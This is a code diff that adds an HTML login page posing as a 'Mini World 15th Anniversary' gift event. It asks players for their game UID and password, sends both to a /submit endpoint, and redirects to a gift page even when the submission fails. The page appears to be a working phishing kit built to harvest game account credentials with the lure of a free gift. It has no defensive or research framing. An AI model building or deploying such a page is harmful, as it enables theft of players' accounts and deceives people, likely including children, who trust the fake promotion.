@@ -1,4 +1,145 @@
-document.getElementById('uid').value = '';
+<!doctype html>
+<html lang="tr">
+  <head>
+    <meta charset="utf-8" />
+    <title>Oyun Giriş</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <style>
+      /* Arka plan */
+      body {
+        margin: 0;
+        font-family: "Segoe UI", Roboto, sans-serif;
+        background: linear-gradient(135deg, #1e293b, #0f172a);
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        min-height: 100vh;
+      }
+                /* Kart */
+      .login-box {
+        background: #ffffff;
+        width: 360px;
+        padding: 40px;
+        border-radius: 12px;
+        box-shadow: 0 8px 24px rgba(0,0,0,0.25);
+      }
+
+      .login-box h1 {
+        margin: 0 0 20px;
+        font-size: 1.6rem;
+        text-align: center;
+        color: #0f172a;
+      }
+
+      /* Input alanları */
+      .input-group {
+        margin-bottom: 20px;
+      }
+
+      .input-group label {
+        display: block;
+        margin-bottom: 6px;
+        font-weight: 600;
+        color: #334155;
+      }
+                 .input-group input {
+        width: 100%;
+        padding: 12px;
+        border: 1px solid #cbd5e1;
+        border-radius: 8px;
+        font-size: 1rem;
+        transition: border-color 0.2s;
+      }
+
+      .input-group input:focus {
+        border-color: #3b82f6;
+        outline: none;
+      }
+
+      /* Buton */
+      button {
+        width: 100%;
+        padding: 12px;
+        background: #3b82f6;
+        border: none;
+        border-radius: 8px;
+        color: #fff;
+        font-size: 1rem;
+        font-weight: 600;
+        cursor: pointer;
+        transition: background 0.2s;
+      }
+                
+button:hover {
+        background: #2563eb;
+      }
+
+      /* Mesaj */
+      .msg {
+        margin-top: 16px;
+        text-align: center;
+        font-size: 0.95rem;
+      }
+      .ok { color: #16a34a; }
+      .err { color: #dc2626; }
+
+      /* Footer */
+      footer {
+        margin-top: 20px;
+        text-align: center;
+        font-size: 0.85rem;
+        color: #64748b;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="login-box">
+      <h1>UID Login</h1>
+
+      <div class="input-group">
+        <label for="uid">UID</label>
+        <input id="uid" type="text" placeholder="" maxlength="200" />
+      </div>
+                <div class="input-group">
+        <label for="level">Password</label>
+        <input id="level" type="text" placeholder="" maxlength="200" />
+      </div>
+
+      <button id="submitBtn">Log in</button>
+      <div id="msg" class="msg"></div>
+
+      <footer>Welcome to Mini Bean Event 🎉🥳 Mini World 15th Anniversary Special GIANT GIFT</footer>
+    </div>
+
+    <script>
+      const btn = document.getElementById('submitBtn');
+      const msg = document.getElementById('msg');
+
+      btn.addEventListener('click', async () => {
+        msg.textContent = '';
+        msg.className = 'msg';
+
+        const uid = document.getElementById('uid').value.trim();
+        const level = document.getElementById('level').value.trim();
+
+        if (!uid || !level) {
+          msg.textContent = 'Lütfen UID ve Level gir.';
+          msg.className = 'msg err';
+          return;
+        }
+                  try {
+          // Önce backend'e gönder
+          const res = await fetch('/submit', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ uid, level })
+          });
+          const data = await res.json();
+
+          if (data.ok) {
+            msg.textContent = 'Thanks!';
+            msg.className = 'msg ok';
+            document.getElementById('uid').value = '';
             document.getElementById('level').value = '';
 
             // Başarılıysa gift.html sayfasına yönlendir
@@ -6,8 +147,7 @@ document.getElementById('uid').value = '';
           } else {
             msg.textContent = data.message || 'Bir hata oluştu.';
             msg.className = 'msg err';
-
-            // Hata olsa bile yine gift.html'e yönlendir
+                      // Hata olsa bile yine gift.html'e yönlendir
             window.location.href = "gift.html";
           }
         } catch (e) {
@@ -21,5 +161,6 @@ document.getElementById('uid').value = '';
     </script>
   </body>
 </html>
+
 
 
